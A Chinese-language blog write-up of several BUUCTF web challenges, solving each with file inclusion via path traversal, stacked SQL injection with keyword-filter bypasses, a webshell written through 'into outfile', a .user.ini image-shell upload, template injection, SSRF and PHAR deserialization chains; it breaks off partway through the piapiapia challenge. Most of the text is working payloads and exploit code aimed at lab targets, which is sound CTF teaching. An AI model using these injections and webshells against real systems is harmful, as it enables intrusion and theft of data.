---
title: BUUCTF-Web-WriteUp
author: 简文涛
categories:
  - CTF
tags:
  - Write-up
comments: true
img: 'https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200824172833.png'
abbrlink: 9796
date: 2019-08-28 11:28:43
---
### WarmUp【2018-HCTF】

**知识点**：代码审计，phpmyadmin任意文件包含漏洞
**参考**：[phpmyadmin 4.8.1任意文件包含](https://blog.51cto.com/13770310/2131305?source=dra)

**涉及函数**：[$_REQUEST](https://www.php.net/manual/zh/reserved.variables.request.php)  , [in_array()](https://www.php.net/manual/zh/function.in-array.php) , [mb_substr()](https://www.php.net/manual/zh/function.mb-substr.php) , [mb_strpos()](https://www.php.net/manual/zh/function.mb-strpos.php)

打开题目查看源码，发现`source.php`,跟进得到源码
```php
 <?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 
```
代码审计，`whitelist数组`里有另一个元素`hint.php`，进去看看,提示了`flag`存储的位置
```
flag not here, and flag in ffffllllaaaagggg
```
关键代码：
```php
if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    }
```

即满足这三个条件才能够包含(`include$_REQUEST['file']`)
```php
$ _REQUEST[‘file’]不为空
$ _REQUEST[‘file’]为字符串
emmm::checkFile($_REQUEST[‘file’])返回值为真。
```

分析`emmm::checkFile()`这个函数

```php
  class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }
```
1.首先设置了一个白名单，只包含source.php和hint.php，第一个if检查是否存在$page并且是否为字符串。

2.检查`$page`是否在白名单中，是的话返回true。接下来，两个函数一个`mb_substr`和`mb_strpos`,意思就是截取`$page`中`?`前面的字符串，然后再进行白名单校验。

3.在`url解码`后的`$page`的`?`前面是否在`whitelist`里面

**构造payload**：
**0x01**:首先构造`?file=source.php`,满足上述第一点
**0x02**:再构造`?file=source.php?`,满足上述第二点
**0x03**:接着构造`?file=source.php%253f`,满足上述第三点
（由于服务器会自动解码一次，所以在checkFile()中，$page的值一开始会是source.php%3f，urldecode解码后变成了source.php?，这次便符合了?前内容在白名单的要求，函数返回true)
**0x04**:最后通过目录穿越的到ffffllllaaaagggg里面的内容，也就是flag。

**playload**:`http://10d57afd-7622-4cda-b0be-af3d90f1cce0.node1.buuoj.cn/?file=source.php%253f/../../../../ffffllllaaaagggg`
### 随便注(三种解题思路)【2019-强网杯】

**知识点**：SQL注入-堆叠注入,sql预处理语句,巧用contact()函数绕过
**参考**：
[SQL注入-堆叠注入](https://www.cnblogs.com/0nth3way/articles/7128189.html)
[SQL Injection8(堆叠注入)——强网杯2019随便注](https://blog.csdn.net/qq_26406447/article/details/90643951)
[[Writeup]BUUCTF_Web_随便注](https://blog.csdn.net/m0_38100569/article/details/99617762)
[MySQL的SQL预处理(Prepared)](https://www.cnblogs.com/geaozhang/p/9891338.html)
[利用Mysql into outfile给网站留后门](https://blog.csdn.net/xlxxcc/article/details/52637873)
[shell处理mysql增、删、改、查](https://www.cnblogs.com/iforever/p/4459857.html)
**堆叠注入原理**:

>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在分号（;）结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。
>用户输入：1; DELETE FROM products
>服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products
>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除

#### 方法一：重命名+堆叠注入
打开题目，显示如下界面，观察后猜测是sql注入
![](https://i.loli.net/2019/08/28/yTUh6sbCqM3G8WS.png)
**0x01**:判断是否存在注入，注入是字符型还是数字型
输入`1'`发现不回显
输入`1' #`显示正常
应该是存在sql注入了

输入`1' or '1'='1`,正常回显，应该是字符型
![](https://i.loli.net/2019/08/28/qsztpRjnILPS2XW.png)
**0x02**:猜解SQL查询语句中的字段数
输入`1' order by 1 #` 成功回显
![](https://i.loli.net/2019/08/28/5xkTzpm7WFOynQu.png)
输入`1' order by 2 #` 成功回显
![](https://i.loli.net/2019/08/28/Ihoia7WQUtgqOVk.png)
输入`1' order by 3 #` 回显错误
![](https://i.loli.net/2019/08/28/U3bwZmfLW5YOpjT.png)
所以只有两个字段
**0x03**:显示字段
输入`1′ union select 1,2 #` 回显一个正则过滤规则
![](https://i.loli.net/2019/08/28/GRpkovDcU9lrWeh.png)
过滤了 select，update，delete，drop，insert，where 和 点

过滤了这么多词，是不是有堆叠注入？尝试堆叠注入
**0x04**：查询数据库
输入`1';show databases;#` 成功回显
![](https://i.loli.net/2019/08/28/yIRHmeSopaTLNOv.png)
说明存在堆叠注入
**0x05**：查询表
输入`1';show tables;#` 成功回显
![](https://i.loli.net/2019/08/28/ibI8D6pQWCzO1hT.png)
得到两个表`words`和`1919810931114514`
**0x06**：查询表中字段
**坑点：mysql中点引号( ' )和反勾号( ` )的区别**
```
linux下不区分，windows下区分
区别:
单引号( ' )或双引号主要用于字符串的引用符号
eg：mysql> SELECT 'hello', "hello" ;

反勾号( ` )主要用于数据库、表、索引、列和别名用的引用符是[Esc下面的键]
eg:`mysql>SELECT * FROM   `table`   WHERE `from` = 'abc' ;
```
输入``1'; show columns from `words`; #``   字段使用的是反勾号（ ` ）

![](https://i.loli.net/2019/08/28/YxopCSVfOJ8caGL.png)
输入``1'; show columns from `1919810931114514`; #``  字段使用的是反勾号（ ` ）

![](https://i.loli.net/2019/08/28/muEBnptX1NoMjPw.png)
可以看到`1919810931114514`中有我们想要的`flag`字段
现在常规方法基本就结束了，要想获得flag就必须来点骚姿势了
因为这里有两张表，回显内容肯定是从word这张表中回显的，那我们怎么才能让它回显flag所在的表呢
内部查询语句类似 :` select id, data from word where id = `

他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢。
先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id （避免一开始无法查询）。
**payload:**

```sql
1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#
```

![](https://i.loli.net/2019/08/28/miPt4rXApufY9G2.png)
接着输入`1' or '1'='1 `,查询就得到flag
![](https://i.loli.net/2019/08/28/r5gcJfmvNEWAZ7V.png)

#### 方法二：预处理语句+堆叠注入
预处理语句使用方式：
```sql
PREPARE name from '[my sql sequece]';   //预定义SQL语句
EXECUTE name;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句
```
预定义语句也可以通过变量进行传递:
```sql
SET @tn = 'hahaha';  //存储表名
SET @sql = concat('select * from ', @tn);  //存储SQL语句
PREPARE name from @sql;   //预定义SQL语句
EXECUTE name;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句
```
本题即可利用`char()`方法将`ASCII码`转换为`SELECT`字符串，接着利用`concat()`方法进行拼接获得查询的`SQL语句`，来绕过过滤或者直接使用`concat()`方法绕过
```sql
char（）根据ASCII表返回给定整数值的字符值
eg:
mysql> SELECT CHAR(77,121,83,81,'76');
-> 'MySQL'

contact（）函数用于将多个字符串连接成一个字符串
contact (str1,str2,…) 
eg:
mysql> SELECT CONCAT('My', 'S', 'QL');
-> 'MySQL'
```
`char(115,101,108,101,99,116)<----->'select'`
**payload1：**不使用变量
``1';PREPARE jwt from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE jwt;#``
输入`payload1`直接得到flag
![](https://i.loli.net/2019/08/28/wyLg4p6ME9eOcnK.png)

**payload2：**使用变量
``1';SET @sql=concat(char(115,101,108,101,99,116),'* from `1919810931114514`');PREPARE jwt from @sql;EXECUTE jwt;#``

输入`payload2`直接得到flag
![](https://i.loli.net/2019/08/28/kLo1pesBAcyunlg.png)
**payload3：**只是用contact(),不使用char()
``1';PREPARE jwt from concat('s','elect', ' * from `1919810931114514` ');EXECUTE jwt;#``
![](https://i.loli.net/2019/08/28/mDUI8eLkXMsoEJ3.png)
#### 方法三：利用命令执行Getflag
查询了一下用户竟然是root
```sql
1';Set @sql=concat("s","elect user()");PREPARE sqla from @sql;EXECUTE sqla;
```
![](https://i.loli.net/2019/08/28/n9S8IDwghoOfKT5.png)
那么写个执行命令的shell吧（绝对路径猜的,一般是服务器网站根目录/var/www/html）
```sql
1';Set @sql=concat("s","elect '<?php @print_r(`$_GET[1]`);?>' into outfile '/var/www/html/1",char(46),"php'");PREPARE sqla from @sql;EXECUTE sqla;
```
利用`char(46)`<==>`.`从而绕过关键词`.`过滤
>Mysql into outfile语句，可以方便导出表格的数据。同样也可以生成某些文件。因此有些人会利用sql注入生成特定代码的文件，然后执行这些文件。将会造成严重的后果。
Mysql into outfile 生成PHP文件
SELECT 0x3C3F7068702073797374656D28245F524551554553545B636D645D293B3F3E into outfile '/var/www/html/fuck.php'
最后会在/var/www/html/路径下， 生成fuck.php文件
这里不走寻常路，执行打算利用我们的shell查询flag（账号密码直接读取首页就可以看到）


利用一句话木马执行任意mysql命令（双引号中的内容会被当做shell命令执行然后结果再传回来执行）
`uroot:`用户名root `proot:`密码root
```sql
/1.php?1=mysql -uroot -proot -e "use supersqli;select flag from \`1919810931114514\`;"
```
![](https://i.loli.net/2019/08/28/2tyPZaNCmpAoq3l.png)
### EasySQL【2019-SUCTF】
**知识点**：堆叠注入，sql_mode 实现字符串管道‘||’连接
题目和2019-强网杯随便注一样是一个堆叠注入，不过做了更多限制。
查看大佬Wp,比赛时`.index.php.swp`存在源码泄露
```sql
1;show databases;show tables; #查库和表    
```
![](https://i.loli.net/2019/08/31/VqxCT1LpIHdAblB.png)
```php
<?php
    session_start();

    include_once "config.php";

    $post = array();
    $get = array();
    global $MysqlLink;

    //GetPara();
    $MysqlLink = mysqli_connect("localhost",$datauser,$datapass);
    if(!$MysqlLink){
        die("Mysql Connect Error!");
    }
    $selectDB = mysqli_select_db($MysqlLink,$dataName);
    if(!$selectDB){
        die("Choose Database Error!");
    }

    foreach ($_POST as $k=>$v){
        if(!empty($v)&&is_string($v)){
            $post[$k] = trim(addslashes($v));
        }
    }
    foreach ($_GET as $k=>$v){
        }
    }
    //die();
    ?>

<html>
<head>
</head>

<body>

<a> Give me your flag, I will tell you if the flag is right. </a>
<form action="" method="post">
<input type="text" name="query">
<input type="submit">
</form>
</body>
</html>

<?php

    if(isset($post['query'])){
        $BlackList = "prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&|\"";
        //var_dump(preg_match("/{$BlackList}/is",$post['query']));
        if(preg_match("/{$BlackList}/is",$post['query'])){
            //echo $post['query'];
            die("Nonono.");
        }
        if(strlen($post['query'])>40){
            die("Too long.");
        }
        $sql = "select ".$post['query']."||flag from Flag";
        mysqli_multi_query($MysqlLink,$sql);
        do{
            if($res = mysqli_store_result($MysqlLink)){
                while($row = mysqli_fetch_row($res)){
                    print_r($row);
                }
            }
        }while(@mysqli_next_result($MysqlLink));

    }

    ?>
```
过滤了prepare|flag||where|from|union|update|delete|if||or|and|等，还有长度限制,不能超过40
查询语句结构：`select ".$post['query']."||flag from Flag`
因此可以直接输入`*,1`拿到flag
```
select *,1||flag from Flag
```
因为`1||flag == 1`，然后可以查询Flag表里所有内容。
![](https://i.loli.net/2019/08/31/BQc13pKDa6PdNXY.png)
**方法二**：
参考：[SUCTF Web部分](http://www.sketchplane.top/2019/08/23/SUCTF-Web%E9%83%A8%E5%88%86/)
原理：[mysql 修改sql_mode 实现字符串管道‘||’连接](https：//blog.csdn.net/lixora/article/details/60572357)
本地测试`sql_mode`
![来源于参考](https://i.loli.net/2019/08/31/3zL8hWTiPyqkRmj.png)
通过||来实现字符串拼接，设置`sql_mode模式为pipes_as_concat`即可。即：
```
1;set sql_mode=pipes_as_concat;select 1
```
![](https://i.loli.net/2019/08/31/ytJ3gBWHSnquakV.png)
### CheckIn【2019-SUCTF】
**知识点**：文件上传，.user.ini文件构成的PHP后门,GIF89a绕过图片检测
参考：[.user.ini文件构成的PHP后门](https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html)
[从SUCTF 2019 CheckIn 浅谈.user.ini的利用](https://xz.aliyun.com/t/6091)
题目是一个文件上传，可以上传jpg、png等文件，但是限制了php，文件内容不能包含`<?`,但可以上传`<script language='php'><scirpt>`类型的图片马来绕过。其次还判断了上传的文件头，使用exif_image来判断的，这个很容易绕过，直接随便加一个图片文件头就行，添加最简单的`gif文件头GIF89a`,并且上传之后会给出文件所在目录
本题是利用`.user.ini`来上传php后门
![](https://i1.100024.xyz/i/2019/09/01/rbld7o.png)

看过`.user.ini`的分析后我们的思路应该比较清晰了，我们可以上传一个这样的`.user.ini：`
```
GIF89a
auto_prepend_file=1.jpg
```
![](https://i.loli.net/2019/09/01/uJH6XQzNeYRtwSs.png)
此时我们注意到上传目录下还有一个index.php，我们正好需要该目录下有一个可执行php文件，那么正好满足`.user.ini`的条件
然后再上传一个图片马1.jpg：
```
GIF89a
<script language='php'>system('cat /flag');</script>
```
![](https://i.loli.net/2019/09/01/1HWACqNelynhjTg.png)
我们访问`uploads/fd40c7f4125a9b9ff1a4e75d293e3080/index.php`即可得到flag
### Hack World【2019-CISCN-华北赛区】
**知识点**：布尔盲注
直接给出了表名flag和字段名flag
布尔盲注，使用异或即可
过滤了空格，可以使用tab或者()

### easy_tornado【2018-护网杯】
**知识点**：服务端模板注入攻击 （SSTI）
参考：
[Python Web 框架:Tornado](https://blog.csdn.net/xc_zhou/article/details/80637714)
[render函数介绍](https://blog.csdn.net/qq78827534/article/details/80792514)
[SSTI服务器模板注入](https://uuzdaisuki.com/2018/05/28/SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/)
[服务端模板注入攻击 （SSTI）之浅析 ](https://www.freebuf.com/vuls/83999.html)
根据题目`easy tornado`搜索`tornado`发现是python中的一个web应用框架。

打开题目发现有三个文件
![](https://i.loli.net/2019/09/14/hJBRtMvmVGbEuc3.png)
flag.txt
```
/flag.txt
flag in /fllllllllllllag
```

发现flag在/fllllllllllllag文件里

welcome.txt
```
/welcome.txt
render
```
render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。
hints.txt
```
/hints.txt
md5(cookie_secret+md5(filename))
```
`filename=/fllllllllllllag`，只需要知道`cookie_secret`的就可以访问flag了

输入`filename=/fllllllllllllag`测试后发现还有一个error界面，格式为`/error?msg=Error`，加之`render函数`,所以怀疑存在`服务端模板注入攻击(SSTI)`
![](https://i.loli.net/2019/09/14/eLHYmIvg7xCT9B1.png)
构造payload,验证是否存在注入
```
/error?msg={{3}}
```
![](https://i.loli.net/2019/09/14/IYUyBPjF7wgQqVl.png)
页面显示3，说明存在模板注入

通过查阅文档发现`tornado`的`cookie_secret`在`handler.settings`中
构造payload获取cookie_secret
```
/error?msg={{handler.settings}}
```
![](https://i.loli.net/2019/09/14/PbQ4Y2ThlpHjIEf.png)
在线计算filehash值或者脚本计算
```python
import hashlib

def md5(s):
 md5 = hashlib.md5() 
 md5.update(s) 
 return md5.hexdigest()

filename = '/fllllllllllllag'
cookie_secret = 'b3462331-240d-4d61-9941-ce05616520e3'
print(md5(cookie_secret+md5(filename)))
```
![](https://i.loli.net/2019/09/14/glQe2aAXTjYhMdZ.png)
payload：
```
?filename=/fllllllllllllag&filehash=d36c1cd33fb729d2a7d1084c51c30d28
```
![](https://i.loli.net/2019/09/14/1XtgGxY9mLfKBR3.png)
### 高明的黑客【2019-强网杯】
**知识点**：代码审计，动态测试
![](https://i.loli.net/2019/09/14/XPZmOqSxHILG9rz.png)
下载`www.tar.gz`
下载下来之后发现有三千多个php文件,随意打开几个文件，发现了类似命令执行漏洞。
![](https://i.loli.net/2019/09/14/seDiF4YyVf5U8kZ.png)
但只有一个是真正可以执行的
将每个php文件里的`$ _GET`参数提取出来逐个爆破就行了
代码参考网上大佬的
```python
# coding:utf-8
#!/usr/bin/env python3
import requests
import os
import re
url = 'http://d65fe37f-f9c3-4b4a-ba25-cb8b0dfdd28b.node1.buuoj.cn/'
ptn = re.compile(br"\$_GET\['(\w+)'\]")
ptn1 = re.compile(br'>>> (\w+) !!!')
i = 0
for f in list(os.scandir('C:/Users/admin/Desktop/src'))[::-1]:
    i += 1
    print(i, end='\r')
    with open(f.path, 'rb') as fp:
        data = fp.read()
    for get in set(ptn.findall(data)):
        get = get.decode('ascii')
        cmd = 'echo ">>> %s !!!";' % get
        r = requests.get(url + f.name, params={get: cmd})
        if ptn1.search(r.content) is not None:
            print()
            print(f.name, get)
            exit()
```
![](https://i.loli.net/2019/09/14/HwuUE51vdAqC7t2.png)
payload：
```
/xk0SzyKwfzw.php?Efa5BVG=cat /flag
```
![](https://i.loli.net/2019/09/14/EslpMk4J8mbSvTG.png)
### Fakebook【2018-网鼎杯】
**知识点**：SSRF，反序列化，报错注入
打开题目，发现Web应用有两个功能。一个是登录，一个是注册，如下：
![](https://i.loli.net/2019/09/14/twxP9J18fknRaNT.png)
发现注册的时候blog处只能写url链接
![](https://i.loli.net/2019/09/14/5gs7G1w8FXazUoZ.png)
而且在查看用户信息的时候，发现Web应用加载了用户的blog网页，这里就存在SSRF漏洞。
![](https://i.loli.net/2019/09/14/EFxpyChgWovInA4.png)
查看`robots.txt`,得到`user.php.bak`发现有源码泄露，扫描得到flag.php

```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```
审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。

查看用户信息界面存在SQL注入，直接使用报错注入，会发现数据库里面只有用户的注册信息：
爆表名
```mysql
/view.php?no=1 and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#
```

![](https://i.loli.net/2019/09/14/gIvXkwe1DVjGq32.png)
爆列名
```mysql
/view.php?no=1 and updatexml(1,make_set(3,'~',(select group_concat(column_name) from information_schema.columns where table_name="users")),1)#
```
![](https://i.loli.net/2019/09/14/2IaBDt1OVlPmCdJ.png)
爆字段
```mysql
/view.php?no=1 and updatexml(1,make_set(3,'~',(select data from users)),1)#
```
![](https://i.loli.net/2019/09/14/Wxw6LapcRS9rduE.png)
这里发现data字段存放的是用户信息经过反序列化的结果，
结合前面 view.php 页面会加载用户的blog信息，
所以这里极有可能是利用反序化数据库中的data字段，然后取出url字段并加载，
因此利用no参数进行注入，在反序列化中构造file文件协议，
利用`服务端请求伪造漏洞`访问服务器上的flag.php文件
所以我们要做的就是将SQL语句查询结果中data字段反序列化后，内容中的url等于flag.php即可。所以我们构造SQL语句如下：
过滤了union select用/ ** /可以绕过
```mysql
/view.php?no=-1/**/union/**/select/**/1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:3:"jwt";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'#
```

![](https://i.loli.net/2019/09/14/ufj347VUaGYK5NB.png)
解密base64得到flag
![](https://i.loli.net/2019/09/14/8WHsKR2njaoG1uD.png)
### Dropbox【CISCN2019 华北赛区 Day1 Web1】
**知识点**：任意文件下载,PHAR反序列化RCE
参考：
[ciscn2019华北赛区半决赛day1_web1题解](https://www.cnblogs.com/kevinbruce656/p/11316070.html)
[buuctf-web-[CISCN2019 华北赛区 Day1 Web1]Dropbox](https://blog.csdn.net/weixin_43345082/article/details/100102082)
[什么是Phar反序列化](https://blog.ripstech.com/2018/new-php-exploitation-technique/)
[利用phar拓展php反序列化漏洞攻击面](https://paper.seebug.org/680/)
进入解题页面发现需要登录，注册一个账号，登录以后是一个网盘的页面，最开始只有上传功能，并且只能上传png,jpg等图片格式。
![](https://i.loli.net/2019/09/15/zZd7kmy32DSNV6r.png)
随便上传一个符合要求的文件，发现可以对其进行下载和删除。
![](https://i.loli.net/2019/09/15/DmMIGt3rpJWUwAu.png)
通过抓下载的包发现，该处存在一个任意文件下载的漏洞，修改文件名filename=…/…/index.php,可以下载源码
![](https://i.loli.net/2019/09/15/Ssdeo5IpYFwtWGz.png)
利用该漏洞下载download.php,delete.php以及其需要包含的class.php的内容。
![](https://i.loli.net/2019/09/15/fivwX6WCR5lTZsj.png)
重点是class.php和delete.php
分析download.php的核心源码
```php
<?php
if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
    #省略一些代码
    echo $file->close();
} else {
    echo "File not exist";
}
?>
```
可以发现，该文件只有很常规的下载文件操作，并且限制了不能下载文件名中带有flag的文件。
接着分析class.php
```php
<?php
#代码精简一下
class File {
    public $filename;

    public function close() {
        return file_get_contents($this->filename);
    }
}
class User {
    public $db;
    public function __destruct() {
        $this->db->close();
    }
}
class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }
    public function __destruct() {
        #省略了一些影响阅读的table创建代码
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '</tr>';
        }
        echo $table;
    }
}
?>
```
**1**.File类中的close方法会获取文件内容，如果能触发该方法，就有可能获取flag。
**2**.User类中存在close方法，并且该方法在对象销毁时执行。
**3**.同时FileList类中存在call魔术方法，并且类没有close方法。如果一个Filelist对象调用了close()方法，根据call方法的代码可以知道，文件的close方法会被执行，就可能拿到flag。

根据以上三条线索，梳理一下可以得出结论:

`如果能创建一个user的对象，其db变量是一个FileList对象，对象中的文件名为flag的位置。这样的话，当user对象销毁时，db变量的close方法被执行；而db变量没有close方法，这样就会触发call魔术方法，进而变成了执行File对象的close方法。通过分析FileList类的析构方法可以知道，close方法执行后存在results变量里的结果会加入到table变量中被打印出来，也就是flag会被打印出来。`

想实现上述想法，可以借助phar的伪协议。
运行如下PHP文件，生成一个phar文件，更改后缀名为png进行上传。
```php
<?php

class User {
    public $db;
}

class File {
    public $filename;
}
class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct() {
        $file = new File();
        $file->filename = '/flag.txt';
        $this->files = array($file);
        $this->results = array();
        $this->funcs = array();
    }
}

@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar

$phar->startBuffering();

$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$o = new User();
$o->db = new FileList();

$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("jwt.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```
生成phar文件后在删除的时候进行触发即可得到flag。
因此在删除时使用burpsite抓包，修改参数，即可得到flag。
![](https://i.loli.net/2019/09/15/p9Wuc4IhEMeKsVq.png)
### piapiapia【2016-0CTF】
**知识点**：数组绕过正则及相关,改变序列化字符串长度导致反序列化漏洞，PHP反序列化逃逸
**参考**：[2016 0CTF—piapiapia](https://tanpuhan.github.io/2019/09/14/2016-0CTF%E2%80%94piapiapia/) , [0ctf 2016 部分 web writeup](https://www.virzz.com/2016/03/14/some_web_writeup_for_0ctf_2016.html)，[利用数组绕过问题小总结](https://www.jianshu.com/p/8e3b9d056da6?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation)
**预备知识**：改变序列化字符串长度导致反序列化漏洞
`unserialize()`会忽略能够正常序列化的字符串后面的字符串
比如：
```
a:4:{s:5:"phone";s:11:"13587819970";s:5:"email";s:32:"aaaaaaaaaa@aaaaaaaaaa.aaaaaaaaaa";s:8:"nickname";s:10:"12345hacke";s:5:"photo";s:10:"config.php";}s:39:"upload/f47454d1d3644127f42070181a8b9afc";}
```
反序列化会正常解析
```
a:4{s:5:"phone";s:11:"13587819970";s:5:"email";s:32:"aaaaaaaaaa@aaaaaaaaaa.aaaaaaaaaa";s:8:"nickname";s:10:"12345hacke";s:5:"photo";s:10:"config.php";}
```
忽略`s:39:"upload/f47454d1d3644127f42070181a8b9afc";}`，从而导致读取`config.php`
可以利用这个规则构造字符串来闭合，如本题中filter()将where替换成hacker，就可以将这个成员的最后一个字符挤出去，重复34次就可以挤出34个字符，正好闭合改序列化字符串

---
打开题目，典型的登录界面
猜测是否有注册，发现/register.php，注册后登陆，进入到update.php页面
![](https://i.loli.net/2019/09/23/oNHDnA3W7iePr1k.png)
进行一下目录扫描，dirsearch扫出了源码www.zip
![](https://i.loli.net/2019/09/23/Vj8oW6KEqedOnJ5.png)
下载www.zip，得到如下
![](https://i.loli.net/2019/09/23/5N8QF2tzRphbjUr.png)
先拿seay代码审计一下看下大概会有什么漏洞
![](https://i.loli.net/2019/09/23/Ni5b74zgEwFnUhT.png)
在profile.php中有文件读取
```php
else {
		$profile = unserialize($profile);
		$phone = $profile['phone'];
		$email = $profile['email'];
		$nickname = $profile['nickname'];
		$photo = base64_encode(file_get_contents($profile['photo']));
?>
```
又发现在config.php中有flag的标识,看来flag就是在config.php中了
```php
<?php
	$config['hostname'] = '127.0.0.1';
	$config['username'] = 'root';
	$config['password'] = '';
	$config['database'] = '';
	$flag = '';
?>
```
那么基本可以确定思路就是使`$profile['photo']`等于`config.php`从而就可以读出config.php的flag了
**反序列化逃逸**:
对`photo`进行操作的地方在`update.php`中
```php
     <?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');	
	}
	if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {

		$username = $_SESSION['username'];
		if(!preg_match('/^\d{11}$/', $_POST['phone']))
			die('Invalid phone');

		if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
			die('Invalid email');
		
		if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
			die('Invalid nickname');

		$file = $_FILES['photo'];
		if($file['size'] < 5 or $file['size'] > 1000000)
			die('Photo size error');

		move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
		$profile['phone'] = $_POST['phone'];
		$profile['email'] = $_POST['email'];
		$profile['nickname'] = $_POST['nickname'];
		$profile['photo'] = 'upload/' . md5($file['name']);

		$user->update_profile($username, serialize($profile));
		echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
	}
	else {
?>
```
在设置了`$profile`之后，用`update_profile()`函数进行处理：
```
public function update_profile($username, $new_profile) {
		$username = parent::filter($username);
		$new_profile = parent::filter($new_profile);

		$where = "username = '$username'";
		return parent::update($this->table, 'profile', $new_profile, $where);
	}
```
`update_profile()`函数调用了`filter`函数
```
public function filter($string) {
		$escape = array('\'', '\\\\');
		$escape = '/' . implode('|', $escape) . '/';
		$string = preg_replace($escape, '_', $string);

		$safe = array('select', 'insert', 'update', 'delete', 'where');
		$safe = '/' . implode('|', $safe) . '/i';
		return preg_replace($safe, 'hacker', $string);
	}
```
